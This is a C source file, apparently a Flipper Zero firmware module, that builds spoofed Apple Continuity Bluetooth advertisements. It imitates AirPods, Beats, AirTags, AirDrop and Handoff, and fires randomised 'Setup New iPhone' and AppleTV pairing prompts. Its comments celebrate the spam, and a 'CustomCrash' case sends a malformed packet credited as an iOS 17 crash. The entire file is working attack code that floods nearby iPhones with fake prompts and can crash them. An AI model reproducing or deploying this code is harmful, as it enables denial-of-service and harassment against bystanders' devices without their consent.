#include "continuity.h"
#include "_registry.h"

// Hacked together by @Willy-JL
// iOS 17 Crash by @ECTO-1A
// Nearby Action IDs and Documentation at https://github.com/furiousMAC/continuity/
// Proximity Pair IDs from https://github.com/ECTO-1A/AppleJuice/

static const char* type_names[ContinuityTypeCount] = {
    [ContinuityTypeAirDrop] = "AirDrop",
    [ContinuityTypeProximityPair] = "Proximity Pair",
    [ContinuityTypeAirplayTarget] = "Airplay Target",
    [ContinuityTypeHandoff] = "Handoff",
    [ContinuityTypeTetheringSource] = "Tethering Source",
    [ContinuityTypeNearbyAction] = "Nearby Action",
    [ContinuityTypeNearbyInfo] = "Nearby Info",
    [ContinuityTypeCustomCrash] = "Custom Packet",
};
const char* continuity_get_name(const BleSpamMsg* _msg) {
    const ContinuityMsg* msg = &_msg->continuity;
    return type_names[msg->type];
}

#define HEADER_LEN (6) // 1 Size + 1 AD Type + 2 Company ID + 1 Continuity Type + 1 Continuity Size
static uint8_t packet_sizes[ContinuityTypeCount] = {
    [ContinuityTypeAirDrop] = HEADER_LEN + 18,
    [ContinuityTypeProximityPair] = HEADER_LEN + 25,
    [ContinuityTypeAirplayTarget] = HEADER_LEN + 6,
    [ContinuityTypeHandoff] = HEADER_LEN + 14,
    [ContinuityTypeTetheringSource] = HEADER_LEN + 6,
    [ContinuityTypeNearbyAction] = HEADER_LEN + 5,
    [ContinuityTypeNearbyInfo] = HEADER_LEN + 5,
    [ContinuityTypeCustomCrash] = HEADER_LEN + 11,
};

void continuity_make_packet(uint8_t* out_size, uint8_t** out_packet, const BleSpamMsg* _msg) {
    const ContinuityMsg* msg = _msg ? &_msg->continuity : NULL;

    ContinuityType type;
    if(msg) {
        type = msg->type;
    } else {
        const ContinuityType types[] = {
            ContinuityTypeProximityPair,
            ContinuityTypeNearbyAction,
            ContinuityTypeCustomCrash,
        };
        type = types[rand() % COUNT_OF(types)];
    }

    uint8_t size = packet_sizes[type];
    uint8_t* packet = malloc(size);
    uint8_t i = 0;

    packet[i++] = size - 1; // Size
    packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
    packet[i++] = 0x4C; // Company ID (Apple, Inc.)
    packet[i++] = 0x00; // ...
    packet[i++] = type; // Continuity Type
    packet[i] = size - i - 1; // Continuity Size
    i++;

    switch(type) {
    case ContinuityTypeAirDrop: {
        packet[i++] = 0x00; // Zeros
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x01; // Version
        packet[i++] = (rand() % 256); // AppleID
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // Phone Number
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // Email
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // Email2
        packet[i++] = (rand() % 256); // ...
        packet[i++] = 0x00; // Zero
        break;
    }

    case ContinuityTypeProximityPair: {
        uint16_t model;
        if(msg && msg->data.proximity_pair.model != 0x0000) {
            model = msg->data.proximity_pair.model;
        } else {
            const uint16_t models[] = {
                0x0E20, // AirPods Pro
                0x0620, // Beats Solo 3
                0x0A20, // AirPods Max
                0x1020, // Beats Flex
                0x0055, // Airtag
                0x0030, // Hermes Airtag
                0x0220, // AirPods
                0x0F20, // AirPods 2nd Gen
                0x1320, // AirPods 3rd Gen
                0x1420, // AirPods Pro 2nd Gen
                0x0320, // Powerbeats 3
                0x0B20, // Powerbeats Pro
                0x0C20, // Beats Solo Pro
                0x1120, // Beats Studio Buds
                0x0520, // Beats X
                0x0920, // Beats Studio 3
                0x1720, // Beats Studio Pro
                0x1220, // Beats Fit Pro
                0x1620, // Beats Studio Buds+
            };
            model = models[rand() % COUNT_OF(models)];
        }

        uint8_t prefix;
        if(msg && msg->data.proximity_pair.prefix == 0x00) {
            prefix = msg->data.proximity_pair.prefix;
        } else {
            if(model == 0x0055 || model == 0x0030)
                prefix = 0x05;
            else
                prefix = 0x01;
        }

        packet[i++] = prefix; // Prefix (paired 0x01 new 0x07 airtag 0x05)
        packet[i++] = (model >> 0x08) & 0xFF;
        packet[i++] = (model >> 0x00) & 0xFF;
        packet[i++] = 0x55; // Status
        packet[i++] = ((rand() % 10) << 4) + (rand() % 10); // Buds Battery Level
        packet[i++] = ((rand() % 8) << 4) + (rand() % 10); // Charing Status and Battery Case Level
        packet[i++] = (rand() % 256); // Lid Open Counter
        packet[i++] = 0x00; // Device Color
        packet[i++] = 0x00;
        furi_hal_random_fill_buf(&packet[i], 16); // Encrypted Payload
        i += 16;
        break;
    }

    case ContinuityTypeAirplayTarget: {
        packet[i++] = (rand() % 256); // Flags
        packet[i++] = (rand() % 256); // Configuration Seed
        packet[i++] = (rand() % 256); // IPv4 Address
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        break;
    }

    case ContinuityTypeHandoff: {
        packet[i++] = 0x01; // Version
        packet[i++] = (rand() % 256); // Initialization Vector
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // AES-GCM Auth Tag
        packet[i++] = (rand() % 256); // Encrypted Payload
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        break;
    }

    case ContinuityTypeTetheringSource: {
        packet[i++] = 0x01; // Version
        packet[i++] = (rand() % 256); // Flags
        packet[i++] = (rand() % 101); // Battery Life
        packet[i++] = 0x00; // Cell Service Type
        packet[i++] = (rand() % 8); // ...
        packet[i++] = (rand() % 5); // Cell Service Strength
        break;
    }

    case ContinuityTypeNearbyAction: {
        uint8_t action;
        if(msg && msg->data.nearby_action.type != 0x00) {
            action = msg->data.nearby_action.type;
        } else {
            const uint8_t actions[] = {
                0x13, // AppleTV AutoFill
                0x27, // AppleTV Connecting...
                0x20, // Join This AppleTV?
                0x19, // AppleTV Audio Sync
                0x1E, // AppleTV Color Balance
                0x09, // Setup New iPhone
                0x02, // Transfer Phone Number
                0x0B, // HomePod Setup
                0x01, // Setup New AppleTV
                0x06, // Pair AppleTV
                0x0D, // HomeKit AppleTV Setup
                0x2B, // AppleID for AppleTV?
            };
            action = actions[rand() % COUNT_OF(actions)];
        }

        uint8_t flag;
        if(msg && msg->data.nearby_action.flags != 0x00) {
            flag = msg->data.nearby_action.flags;
        } else {
            flag = 0xC0;
            if(action == 0x20 && rand() % 2) flag--; // More spam for 'Join This AppleTV?'
            if(action == 0x09 && rand() % 2) flag = 0x40; // Glitched 'Setup New Device'
        }

        packet[i++] = flag; // Action Flags
        packet[i++] = action; // Action Type
        furi_hal_random_fill_buf(&packet[i], 3); // Authentication Tag
        i += 3;
        break;
    }

    case ContinuityTypeNearbyInfo: {
        packet[i++] = ((rand() % 16) << 4) + (rand() % 16); // Status Flags and Action Code
        packet[i++] = (rand() % 256); // Status Flags
        packet[i++] = (rand() % 256); // Authentication Tag
        packet[i++] = (rand() % 256); // ...
        packet[i++] = (rand() % 256); // ...
        break;
    }

    case ContinuityTypeCustomCrash: {
        // Found by @ECTO-1A

        const uint8_t actions[] = {
            0x13, // AppleTV AutoFill
            0x27, // AppleTV Connecting...
            0x20, // Join This AppleTV?
            0x19, // AppleTV Audio Sync
            0x1E, // AppleTV Color Balance
            0x09, // Setup New iPhone
            0x02, // Transfer Phone Number
            0x0B, // HomePod Setup
            0x01, // Setup New AppleTV
            0x06, // Pair AppleTV
            0x0D, // HomeKit AppleTV Setup
            0x2B, // AppleID for AppleTV?
        };
        uint8_t action = actions[rand() % COUNT_OF(actions)];

        uint8_t flag = 0xC0;
        if(action == 0x20 && rand() % 2) flag--; // More spam for 'Join This AppleTV?'
        if(action == 0x09 && rand() % 2) flag = 0x40; // Glitched 'Setup New Device'

        i -= 2; // Override segment header
        packet[i++] = ContinuityTypeNearbyAction; // Continuity Type
        packet[i++] = 0x05; // Continuity Size
        packet[i++] = flag; // Action Flags
        packet[i++] = action; // Action Type
        furi_hal_random_fill_buf(&packet[i], 3); // Authentication Tag
        i += 3;

        packet[i++] = 0x00; // Terminator (?)
        packet[i++] = 0x00; // ...

        packet[i++] = ContinuityTypeNearbyInfo; // Continuity Type (?)
        furi_hal_random_fill_buf(&packet[i], 3); // Continuity Size (?) + Shenanigans (???)
        i += 3;
        break;
    }

    default:
        break;
    }

    *out_size = size;
    *out_packet = packet;
}

const BleSpamProtocol ble_spam_protocol_continuity = {
    .icon = &I_apple,
    .get_name = continuity_get_name,
    .make_packet = continuity_make_packet,
};
